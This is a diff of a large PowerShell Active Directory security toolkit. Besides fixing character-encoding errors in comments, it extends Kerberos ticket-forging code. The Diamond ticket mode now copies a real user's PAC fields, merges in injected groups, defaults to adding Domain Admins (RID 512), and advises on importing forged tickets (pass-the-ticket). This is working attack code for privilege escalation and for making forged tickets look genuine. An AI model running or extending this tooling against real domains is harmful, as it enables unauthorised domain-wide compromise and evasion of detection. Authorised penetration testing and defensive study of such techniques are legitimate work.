@@ -1,4 +1,4 @@
-﻿$Script:SeverityClasses = @{
+$Script:SeverityClasses = @{
     Finding  = 'Finding'
     Secure   = 'Secure'
     Hint     = 'Hint'
@@ -10926,10 +10926,10 @@ function Get-AttributeSeverity {
             if (-not $entry.SID) { continue }
             $privResult = Test-IsPrivileged -Identity $entry.SID
             if (-not $privResult.IsPrivileged) {
-                return 'Note'   # Non-Standard â†’ auto-promoted to Primary
+                return 'Note'   # Non-Standard → auto-promoted to Primary
             }
         }
-        return 'Standard'   # All privileged â†’ stays in Extended
+        return 'Standard'   # All privileged → stays in Extended
     }
     $triggerSeverity = Get-SeverityFromTrigger -Name $Name -Value $Value `
         -IsComputer $IsComputer -SourceObject $SourceObject
@@ -12020,11 +12020,11 @@ $Script:ImpactMultipliers = @{
     'none'  = 1.0    # Standard user accounts - base impact
 }
 $Script:PasswordAgeModifiers = @{
-    'multiplier_10x' = 1.6    # Password age >= 10Ã— maxPwdAge
-    'multiplier_5x'  = 1.4    # Password age >= 5Ã— maxPwdAge
-    'multiplier_3x'  = 1.3    # Password age >= 3Ã— maxPwdAge
-    'multiplier_2x'  = 1.2    # Password age >= 2Ã— maxPwdAge
-    'multiplier_1x'  = 1.1    # Password age >= 1Ã— maxPwdAge (over policy)
+    'multiplier_10x' = 1.6    # Password age >= 10× maxPwdAge
+    'multiplier_5x'  = 1.4    # Password age >= 5× maxPwdAge
+    'multiplier_3x'  = 1.3    # Password age >= 3× maxPwdAge
+    'multiplier_2x'  = 1.2    # Password age >= 2× maxPwdAge
+    'multiplier_1x'  = 1.1    # Password age >= 1× maxPwdAge (over policy)
     'within_policy'  = 1.0    # Password age < maxPwdAge
 }
 $Script:PasswordLengthModifiers = @{
@@ -35368,9 +35368,9 @@ function Get-KerberosChecksumNative {
         [int]$EncryptionType
     )
     $checksumType = switch ($EncryptionType) {
-        18 { 16 }    # AES256 â†’ HMAC_SHA1_96_AES256
-        17 { 15 }    # AES128 â†’ HMAC_SHA1_96_AES128
-        23 { -138 }  # RC4 â†’ HMAC_MD5
+        18 { 16 }    # AES256 → HMAC_SHA1_96_AES256
+        17 { 15 }    # AES128 → HMAC_SHA1_96_AES128
+        23 { -138 }  # RC4 → HMAC_MD5
         default { throw "Unsupported encryption type for checksum: $EncryptionType" }
     }
     Write-Verbose "[Get-KerberosChecksumNative] Called with: etype=$EncryptionType, checksumType=$checksumType, keyUsage=$KeyUsage, keyLen=$($Key.Length), dataLen=$($Data.Length)"
@@ -46442,10 +46442,33 @@ function Build-KerbValidationInfo {
         [Parameter(Mandatory=$false)]
         [datetime]$LogoffTime,
         [Parameter(Mandatory=$false)]
-        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT
+        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,
+        [Parameter(Mandatory=$false)]
+        [hashtable]$SourceInfo
     )
+    function Get-SourceValue {
+        param([string]$Key, $Default)
+        if ($SourceInfo -and $SourceInfo.ContainsKey($Key) -and $null -ne $SourceInfo[$Key]) {
+            return $SourceInfo[$Key]
+        }
+        return $Default
+    }
     if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }
     $NEVER_TIME = [int64]0x7FFFFFFFFFFFFFFF
+    $srcFullName           = [string](Get-SourceValue 'FullName' "")
+    $srcLogonScript        = [string](Get-SourceValue 'LogonScript' "")
+    $srcProfilePath        = [string](Get-SourceValue 'ProfilePath' "")
+    $srcHomeDirectory      = [string](Get-SourceValue 'HomeDirectory' "")
+    $srcHomeDirectoryDrive = [string](Get-SourceValue 'HomeDirectoryDrive' "")
+    $srcLogonServer        = [string](Get-SourceValue 'LogonServer' "")
+    $srcLogonCount         = [uint16](Get-SourceValue 'LogonCount' 0)
+    $srcBadPasswordCount   = [uint16](Get-SourceValue 'BadPasswordCount' 0)
+    $srcLogoffTime         = [int64](Get-SourceValue 'LogoffTimeRaw' $NEVER_TIME)
+    $srcKickOffTime        = [int64](Get-SourceValue 'KickOffTimeRaw' $NEVER_TIME)
+    $srcPasswordLastSet    = [int64](Get-SourceValue 'PasswordLastSetRaw' $NEVER_TIME)
+    $srcPasswordCanChange  = [int64](Get-SourceValue 'PasswordCanChangeRaw' $NEVER_TIME)
+    $srcPasswordMustChange = [int64](Get-SourceValue 'PasswordMustChangeRaw' $NEVER_TIME)
+    $srcGroupAttributes    = Get-SourceValue 'GroupAttributes' $null
     $ptrId = 0x00020004
     $ptrIdStep = 4
     $ndrHeader = @()
@@ -46458,25 +46481,25 @@ function Build-KerbValidationInfo {
     $ndrHeader += Write-UInt32LE -Value 0x00020000
     $fixedPart = @()
     $fixedPart += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $LogonTime)
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
-    $fixedPart += Write-Int64LE -Value $NEVER_TIME
+    $fixedPart += Write-Int64LE -Value $srcLogoffTime
+    $fixedPart += Write-Int64LE -Value $srcKickOffTime
+    $fixedPart += Write-Int64LE -Value $srcPasswordLastSet
+    $fixedPart += Write-Int64LE -Value $srcPasswordCanChange
+    $fixedPart += Write-Int64LE -Value $srcPasswordMustChange
     $ptrEffectiveName = $ptrId; $ptrId += $ptrIdStep
     $fixedPart += Write-UnicodeStringRPC -Value $UserName -PointerId $ptrEffectiveName
     $ptrFullName = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrFullName
+    $fixedPart += Write-UnicodeStringRPC -Value $srcFullName -PointerId $ptrFullName
     $ptrLogonScript = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonScript
+    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonScript -PointerId $ptrLogonScript
     $ptrProfilePath = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrProfilePath
+    $fixedPart += Write-UnicodeStringRPC -Value $srcProfilePath -PointerId $ptrProfilePath
     $ptrHomeDir = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDir
+    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectory -PointerId $ptrHomeDir
     $ptrHomeDirDrive = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrHomeDirDrive
-    $fixedPart += Write-UInt16LE -Value 0
-    $fixedPart += Write-UInt16LE -Value 0
+    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectoryDrive -PointerId $ptrHomeDirDrive
+    $fixedPart += Write-UInt16LE -Value $srcLogonCount
+    $fixedPart += Write-UInt16LE -Value $srcBadPasswordCount
     $fixedPart += Write-UInt32LE -Value $UserRID
     $fixedPart += Write-UInt32LE -Value $PrimaryGroupRID
     $groupCount = if ($null -eq $GroupRIDs) { 0 } else { @($GroupRIDs).Count }
@@ -46497,7 +46520,7 @@ function Build-KerbValidationInfo {
     $fixedPart += Write-UInt32LE -Value $userFlags
     $fixedPart += [byte[]]::new(16)
     $ptrLogonServer = $ptrId; $ptrId += $ptrIdStep
-    $fixedPart += Write-UnicodeStringRPC -Value "" -PointerId $ptrLogonServer
+    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonServer -PointerId $ptrLogonServer
     $ptrLogonDomain = $ptrId; $ptrId += $ptrIdStep
     $fixedPart += Write-UnicodeStringRPC -Value $Domain.ToUpper() -PointerId $ptrLogonDomain
     $ptrDomainSid = $ptrId; $ptrId += $ptrIdStep
@@ -46519,18 +46542,23 @@ function Build-KerbValidationInfo {
     $fixedPart += Write-UInt32LE -Value 0
     $referentData = @()
     $referentData += Write-UnicodeStringData -Value $UserName
-    $referentData += Write-UnicodeStringData -Value ""
-    $referentData += Write-UnicodeStringData -Value ""
-    $referentData += Write-UnicodeStringData -Value ""
-    $referentData += Write-UnicodeStringData -Value ""
-    $referentData += Write-UnicodeStringData -Value ""
+    $referentData += Write-UnicodeStringData -Value $srcFullName
+    $referentData += Write-UnicodeStringData -Value $srcLogonScript
+    $referentData += Write-UnicodeStringData -Value $srcProfilePath
+    $referentData += Write-UnicodeStringData -Value $srcHomeDirectory
+    $referentData += Write-UnicodeStringData -Value $srcHomeDirectoryDrive
     if ($groupCount -gt 0) {
         $referentData += Write-UInt32LE -Value $groupCount
-        foreach ($rid in $GroupRIDs) {
-            $referentData += New-GroupMembership -RelativeId $rid
+        $srcGroupAttrsArr = if ($null -ne $srcGroupAttributes) { @($srcGroupAttributes) } else { @() }
+        for ($gi = 0; $gi -lt $GroupRIDs.Count; $gi++) {
+            if ($gi -lt $srcGroupAttrsArr.Count) {
+                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi] -Attributes ([uint32]$srcGroupAttrsArr[$gi])
+            } else {
+                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi]
+            }
         }
     }
-    $referentData += Write-UnicodeStringData -Value ""
+    $referentData += Write-UnicodeStringData -Value $srcLogonServer
     $referentData += Write-UnicodeStringData -Value $Domain.ToUpper()
     $referentData += Write-SIDNDR -SIDString $DomainSID
     if ($sidCount -gt 0) {
@@ -46699,7 +46727,13 @@ function Build-PAC {
         [Parameter(Mandatory=$false)]
         [datetime]$LogonTime,
         [Parameter(Mandatory=$true)]
-        [datetime]$AuthTime
+        [datetime]$AuthTime,
+        [Parameter(Mandatory=$false)]
+        [uint32]$PrimaryGroupRID = $Script:DOMAIN_GROUP_RID_USERS,
+        [Parameter(Mandatory=$false)]
+        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,
+        [Parameter(Mandatory=$false)]
+        [hashtable]$SourceInfo
     )
     if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }
     $AuthTime = [datetime]::new($AuthTime.Year, $AuthTime.Month, $AuthTime.Day,
@@ -46717,9 +46751,19 @@ function Build-PAC {
         17 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 }
         18 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 }
     }
-    $validationInfo = [byte[]](Build-KerbValidationInfo -UserName $UserName -Domain $Domain `
-        -DomainSID $DomainSID -UserRID $UserRID -GroupRIDs $GroupRIDs `
-        -ExtraSIDs $ExtraSIDs -LogonTime $LogonTime)
+    $validationInfoParams = @{
+        UserName   = $UserName
+        Domain     = $Domain
+        DomainSID  = $DomainSID
+        UserRID    = $UserRID
+        GroupRIDs  = $GroupRIDs
+        ExtraSIDs  = $ExtraSIDs
+        LogonTime  = $LogonTime
+        PrimaryGroupRID    = $PrimaryGroupRID
+        UserAccountControl = $UserAccountControl
+    }
+    if ($SourceInfo) { $validationInfoParams['SourceInfo'] = $SourceInfo }
+    $validationInfo = [byte[]](Build-KerbValidationInfo @validationInfoParams)
     $clientInfo = [byte[]](Build-PACClientInfo -ClientName $UserName -ClientId $AuthTime)
     $upnDnsInfo = [byte[]](Build-PACUpnDnsInfo -UserName $UserName `
         -DnsDomainName $DnsDomainName -DomainSID $DomainSID -UserRID $UserRID)
@@ -46940,9 +46984,24 @@ function Read-PAC {
             UserRID = $null
             PrimaryGroupRID = $null
             GroupRIDs = @()
+            GroupAttributes = @()
             ExtraSIDs = @()
             LogonTime = $null
             UserAccountControl = $null
+            FullName = ""
+            LogonScript = ""
+            ProfilePath = ""
+            HomeDirectory = ""
+            HomeDirectoryDrive = ""
+            LogonServer = ""
+            LogonCount = 0
+            BadPasswordCount = 0
+            UserFlags = 0
+            LogoffTimeRaw = $null
+            KickOffTimeRaw = $null
+            PasswordLastSetRaw = $null
+            PasswordCanChangeRaw = $null
+            PasswordMustChangeRaw = $null
             ServerChecksumOffset = $null
             KDCChecksumOffset = $null
             ServerChecksum = $null
@@ -46970,9 +47029,24 @@ function Read-PAC {
                     $result.UserRID = $logonInfo.UserRID
                     $result.PrimaryGroupRID = $logonInfo.PrimaryGroupRID
                     $result.GroupRIDs = $logonInfo.GroupRIDs
+                    $result.GroupAttributes = $logonInfo.GroupAttributes
                     $result.ExtraSIDs = $logonInfo.ExtraSIDs
                     $result.LogonTime = $logonInfo.LogonTime
                     $result.UserAccountControl = $logonInfo.UserAccountControl
+                    $result.FullName = $logonInfo.FullName
+                    $result.LogonScript = $logonInfo.LogonScript
+                    $result.ProfilePath = $logonInfo.ProfilePath
+                    $result.HomeDirectory = $logonInfo.HomeDirectory
+                    $result.HomeDirectoryDrive = $logonInfo.HomeDirectoryDrive
+                    $result.LogonServer = $logonInfo.LogonServer
+                    $result.LogonCount = $logonInfo.LogonCount
+                    $result.BadPasswordCount = $logonInfo.BadPasswordCount
+                    $result.UserFlags = $logonInfo.UserFlags
+                    $result.LogoffTimeRaw = $logonInfo.LogoffTimeRaw
+                    $result.KickOffTimeRaw = $logonInfo.KickOffTimeRaw
+                    $result.PasswordLastSetRaw = $logonInfo.PasswordLastSetRaw
+                    $result.PasswordCanChangeRaw = $logonInfo.PasswordCanChangeRaw
+                    $result.PasswordMustChangeRaw = $logonInfo.PasswordMustChangeRaw
                     $result.RawValidationInfo = $bufferData
                     $result.RawValidationInfoOffset = $buffer.Offset
                     $result.RawValidationInfoSize = $buffer.Size
@@ -47018,15 +47092,29 @@ function Read-KerbValidationInfo {
     )
     $result = [PSCustomObject]@{
         LogonTime = $null
-        LogoffTime = $null
         UserName = $null
         Domain = $null
         DomainSID = $null
         UserRID = $null
         PrimaryGroupRID = $null
         GroupRIDs = @()
+        GroupAttributes = @()
         ExtraSIDs = @()
         UserAccountControl = $null
+        FullName = ""
+        LogonScript = ""
+        ProfilePath = ""
+        HomeDirectory = ""
+        HomeDirectoryDrive = ""
+        LogonServer = ""
+        LogonCount = 0
+        BadPasswordCount = 0
+        UserFlags = 0
+        LogoffTimeRaw = $null
+        KickOffTimeRaw = $null
+        PasswordLastSetRaw = $null
+        PasswordCanChangeRaw = $null
+        PasswordMustChangeRaw = $null
     }
     try {
         $offset = 0
@@ -47043,10 +47131,15 @@ function Read-KerbValidationInfo {
         $logonTime = Read-Int64LE -Data $Data -Offset $offset
         $result.LogonTime = ConvertFrom-FileTime -FileTime $logonTime
         $offset += 8
+        $result.LogoffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
+        $result.KickOffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
+        $result.PasswordLastSetRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
+        $result.PasswordCanChangeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
+        $result.PasswordMustChangeRaw = Read-Int64LE -Data $Data -Offset $offset
         $offset += 8
         $effectiveNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
         $offset += 8
@@ -47060,7 +47153,9 @@ function Read-KerbValidationInfo {
         $offset += 8
         $homeDirDrivePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
         $offset += 8
+        $result.LogonCount = Read-UInt16LE -Data $Data -Offset $offset
         $offset += 2
+        $result.BadPasswordCount = Read-UInt16LE -Data $Data -Offset $offset
         $offset += 2
         $result.UserRID = Read-UInt32LE -Data $Data -Offset $offset
         $offset += 4
@@ -47070,6 +47165,7 @@ function Read-KerbValidationInfo {
         $offset += 4
         $groupsPtr = Read-UInt32LE -Data $Data -Offset $offset
         $offset += 4
+        $result.UserFlags = Read-UInt32LE -Data $Data -Offset $offset
         $offset += 4
         $offset += 16
         $logonServerPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
@@ -47122,38 +47218,48 @@ function Read-KerbValidationInfo {
         }
         if ($fullNamePtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.FullName = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($logonScriptPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.LogonScript = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($profilePathPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.ProfilePath = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($homeDirPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.HomeDirectory = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($homeDirDrivePtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.HomeDirectoryDrive = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($groupsPtr -ne 0 -and $groupCount -gt 0) {
             $offset += 4  # Skip MaxCount
             $groups = @()
+            $groupAttrs = @()
             for ($g = 0; $g -lt $groupCount; $g++) {
                 if ($offset + 8 -gt $Data.Length) { break }
                 $rid = Read-UInt32LE -Data $Data -Offset $offset
+                $attr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
                 $groups += $rid
-                $offset += 8  # Skip RID(4) + Attributes(4)
+                $groupAttrs += $attr
+                $offset += 8  # RID(4) + Attributes(4)
             }
             $result.GroupRIDs = $groups
+            $result.GroupAttributes = $groupAttrs
             Write-Log "[Read-KerbValidationInfo] GroupRIDs: $($groups -join ', ')" -Level Debug
         }
         if ($logonServerPtr -ne 0) {
             $str = & $ReadNDRString $Data $offset
+            $result.LogonServer = $str.Value
             $offset += $str.BytesConsumed
         }
         if ($domainNamePtr -ne 0) {
@@ -47396,6 +47502,10 @@ function Invoke-TicketForge {
             'Diamond' { 0 }  # Will be extracted from base TGT
         }
         $effectiveUserRID = if ($PSBoundParameters.ContainsKey('UserRID')) { $UserRID } else { 500 }
+        if ($Mode -eq 'Diamond' -and -not $PSBoundParameters.ContainsKey('GroupRIDs')) {
+            $GroupRIDs = @(512)
+            Write-Log "[Invoke-TicketForge] Diamond: no -GroupRIDs specified, injecting Domain Admins (512) only"
+        }
         $result = switch ($Mode) {
             'Golden' {
                 New-GoldenTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
@@ -47508,6 +47618,13 @@ function Invoke-TicketForge {
                 $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $true -Force
                 $result | Add-Member -NotePropertyName 'PTTResult' -NotePropertyValue $pttResult -Force
                 $result.Message = "$($result.Message) - Ticket imported into session"
+                if (-not (Test-RealmKDCLocatable -Realm $result.Domain)) {
+                    Write-Warning ("[Invoke-TicketForge] Ticket imported, but Windows cannot locate a KDC for realm '$($result.Domain)' " +
+                        "(this host is not joined to it and no '_kerberos._tcp.$($result.Domain.ToLower())' SRV record resolves).")
+                    Write-Warning "[Invoke-TicketForge] Windows tools (net view, klist get, PsExec) will fail with 'no logon servers' (0xc000005e) until the realm is resolvable. The ticket itself is valid."
+                    Write-Warning "[Invoke-TicketForge] Fix on THIS host (elevated): Add-DnsClientNrptRule -Namespace '.$($result.Domain.ToLower())' -NameServers '<DC-IP>'   (alternatively: ksetup /addkdc $($result.Domain) <dc.fqdn> + reboot)"
+                    Write-Log "[Invoke-TicketForge] KDC locator warning emitted for realm '$($result.Domain)'"
+                }
             }
             else {
                 Write-Log "[Invoke-TicketForge] Failed to import ticket: $($pttResult.Error)" -Level Warning
@@ -47542,6 +47659,28 @@ function ConvertFrom-HexStringToBytes {
         $bytes[$i] = [Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
     }
     return $bytes
+}
+function Test-RealmKDCLocatable {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $false)]
+        [string]$Realm
+    )
+    if ([string]::IsNullOrWhiteSpace($Realm)) { return $true }
+    $realmLower = $Realm.ToLowerInvariant()
+    $machineDomain = $env:USERDNSDOMAIN
+    if ($machineDomain -and ($machineDomain.ToLowerInvariant() -eq $realmLower)) {
+        return $true
+    }
+    try {
+        $srv = Resolve-SrvRecord -Name "_kerberos._tcp.$realmLower" -ErrorAction SilentlyContinue
+        if ($srv) { return $true }
+    }
+    catch {
+        Write-Log "[Test-RealmKDCLocatable] SRV lookup error for '$realmLower': $_" -Level Debug
+        return $true
+    }
+    return $false
 }
 function New-GoldenTicket {
     [CmdletBinding()]
@@ -47806,18 +47945,85 @@ function New-DiamondTicket {
         }
         Write-Log "[New-DiamondTicket] Extracted: User=$UserName, Domain=$Domain, SID=$DomainSID, RID=$UserRID"
         Write-Log "[New-DiamondTicket] Timestamps: Auth=$authTime, Start=$startTime, End=$endTime"
+        $diamondSourceInfo = $null
+        $effectiveGroupRIDs = $GroupRIDs
+        $effectiveExtraSIDs = $ExtraSIDs
+        $effectivePrimaryGroupRID = $null
+        $effectiveUAC = $null
+        $effectiveLogonTime = $null
+        if ($parsedPAC) {
+            $origGroups = @($parsedPAC.GroupRIDs)
+            $origAttrs  = @($parsedPAC.GroupAttributes)
+            $mergedGroups = @()
+            $mergedAttrs  = @()
+            for ($i = 0; $i -lt $origGroups.Count; $i++) {
+                $mergedGroups += [uint32]$origGroups[$i]
+                if ($i -lt $origAttrs.Count) {
+                    $mergedAttrs += [uint32]$origAttrs[$i]
+                } else {
+                    $mergedAttrs += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
+                }
+            }
+            foreach ($g in $GroupRIDs) {
+                if ($mergedGroups -notcontains [uint32]$g) {
+                    $mergedGroups += [uint32]$g
+                    $mergedAttrs  += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
+                }
+            }
+            $effectiveGroupRIDs = $mergedGroups
+            $mergedExtra = @()
+            foreach ($s in @($parsedPAC.ExtraSIDs)) { if ($s) { $mergedExtra += $s } }
+            foreach ($s in @($ExtraSIDs)) { if ($s -and ($mergedExtra -notcontains $s)) { $mergedExtra += $s } }
+            $effectiveExtraSIDs = $mergedExtra
+            if ($parsedPAC.PrimaryGroupRID) { $effectivePrimaryGroupRID = [uint32]$parsedPAC.PrimaryGroupRID }
+            if ($null -ne $parsedPAC.UserAccountControl) { $effectiveUAC = [uint32]$parsedPAC.UserAccountControl }
+            if ($parsedPAC.LogonTime) { $effectiveLogonTime = $parsedPAC.LogonTime }
+            $diamondSourceInfo = @{
+                FullName              = $parsedPAC.FullName
+                LogonScript           = $parsedPAC.LogonScript
+                ProfilePath           = $parsedPAC.ProfilePath
+                HomeDirectory         = $parsedPAC.HomeDirectory
+                HomeDirectoryDrive    = $parsedPAC.HomeDirectoryDrive
+                LogonServer           = $parsedPAC.LogonServer
+                LogonCount            = $parsedPAC.LogonCount
+                BadPasswordCount      = $parsedPAC.BadPasswordCount
+                GroupAttributes       = $mergedAttrs
+                LogoffTimeRaw         = $parsedPAC.LogoffTimeRaw
+                KickOffTimeRaw        = $parsedPAC.KickOffTimeRaw
+                PasswordLastSetRaw    = $parsedPAC.PasswordLastSetRaw
+                PasswordCanChangeRaw  = $parsedPAC.PasswordCanChangeRaw
+                PasswordMustChangeRaw = $parsedPAC.PasswordMustChangeRaw
+            }
+            Write-Log "[New-DiamondTicket] Recut: real groups [$($origGroups -join ',')] + injected -> [$($effectiveGroupRIDs -join ',')]"
+        }
+        else {
+            Write-Log "[New-DiamondTicket] No parseable PAC in base TGT - falling back to synthetic PAC rebuild" -Level Warning
+        }
         Write-Log "[New-DiamondTicket] Phase 2: Rebuilding with Golden Ticket implementation..."
         $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
         $domainFQDN = $Domain.ToUpper()
         $domainLower = $Domain.ToLower()
-        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($GroupRIDs -join ', ')"
-        Write-Log "[New-DiamondTicket] Building new PAC with requested groups..."
+        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($effectiveGroupRIDs -join ', ')"
+        Write-Log "[New-DiamondTicket] Building new PAC with merged groups..."
         $authTimeRounded = [datetime]::new($authTime.Year, $authTime.Month, $authTime.Day,
             $authTime.Hour, $authTime.Minute, $authTime.Second, [System.DateTimeKind]::Utc)
-        $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
-            -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
-            -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
-            -EncryptionType $EncryptionType -LogonTime $authTimeRounded -AuthTime $authTimeRounded
+        $pacLogonTime = if ($effectiveLogonTime) { $effectiveLogonTime } else { $authTimeRounded }
+        $buildPacParams = @{
+            UserName       = $UserName
+            Domain         = $domainNetBIOS
+            DnsDomainName  = $Domain
+            DomainSID      = $DomainSID
+            UserRID        = $UserRID
+            GroupRIDs      = $effectiveGroupRIDs
+            ExtraSIDs      = $effectiveExtraSIDs
+            EncryptionType = $EncryptionType
+            LogonTime      = $pacLogonTime
+            AuthTime       = $authTimeRounded
+        }
+        if ($null -ne $effectivePrimaryGroupRID) { $buildPacParams['PrimaryGroupRID'] = $effectivePrimaryGroupRID }
+        if ($null -ne $effectiveUAC)             { $buildPacParams['UserAccountControl'] = $effectiveUAC }
+        if ($diamondSourceInfo)                  { $buildPacParams['SourceInfo'] = $diamondSourceInfo }
+        $pacResult = Build-PAC @buildPacParams
         $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
             -ServerChecksumOffset $pacResult.ServerChecksumOffset `
             -KDCChecksumOffset $pacResult.KDCChecksumOffset `
@@ -47855,8 +48061,8 @@ function New-DiamondTicket {
             UserRID = $UserRID
             OriginalGroups = if ($parsedPAC) { $parsedPAC.GroupRIDs } else { @() }
             AddedGroups = $GroupRIDs
-            GroupRIDs = $GroupRIDs
-            ExtraSIDs = $ExtraSIDs
+            GroupRIDs = $effectiveGroupRIDs
+            ExtraSIDs = $effectiveExtraSIDs
             EncryptionType = $EncryptionType
             EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
             Kvno = $Kvno
@@ -53357,8 +53563,8 @@ function Get-ProtectedUsersStatus {
             }
             Write-Log "[Get-ProtectedUsersStatus] Found $($protectedMemberSIDs.Count) members in Protected Users group"
             $tier0GroupSIDs = Get-Tier0GroupSIDs -DomainSID $domainSID
-            $tier0Accounts = @{}  # SID â†’ Account object (deduplicated)
-            $tier0AccountGroups = @{}  # SID â†’ Array of group names (for display)
+            $tier0Accounts = @{}  # SID → Account object (deduplicated)
+            $tier0AccountGroups = @{}  # SID → Array of group names (for display)
             foreach ($groupSID in $tier0GroupSIDs) {
                 $groupObj = @(Get-DomainGroup -Identity $groupSID @PSBoundParameters)[0]
                 if (-not $groupObj) {
@@ -60154,8 +60360,8 @@ function Get-PasswordInDescription {
             $exclusionPatterns = @(
                 'passw\S*\s*(policy|policies|requirement|guideline|richtlinie|anforderung)',
                 '\bparol[ae]?\s*(policy|politica|cerinta)',
-                'passw\S*\s+(must|should|cannot|shall|muss|soll|darf|kann|mÃ¥|bÃ¸r|deve|trebuie)\s+',
-                'passw\S*\s+(length|complexity|history|age|expir|wechsel|ablauf|historie|lengde|utlÃ¸p|lunghezza|scadenza)',
+                'passw\S*\s+(must|should|cannot|shall|muss|soll|darf|kann|må|bør|deve|trebuie)\s+',
+                'passw\S*\s+(length|complexity|history|age|expir|wechsel|ablauf|historie|lengde|utløp|lunghezza|scadenza)',
                 'passw\S*\s+(reset|change|recover|forgot|reimpost|cambiar|schimb)',
                 '\bparol[ae]?\s+(reset|change|reimpost|cambiar|schimbar)',
                 '(minimum|maximum)\s+passw\S*',
